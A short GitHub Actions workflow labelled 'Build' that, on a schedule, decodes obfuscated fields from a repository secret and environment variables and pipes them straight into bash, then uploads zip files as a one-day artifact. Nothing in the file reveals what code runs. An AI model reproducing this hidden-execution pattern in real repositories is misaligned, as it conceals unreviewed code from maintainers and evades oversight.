name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '51 0,6,12,18 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          li751: ${{ secrets.li751 }}
        run: |
          printf '%s' "$li751" | jq -r .cdl9866 | /bin/bash
          echo $kzv5683 | jq -r .scsbb7 | /bin/bash
          printf '%s' "$gwoz2" | jq -r .zfyd07 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: 74Jkb563
          path: "*.zip"
          retention-days: 1
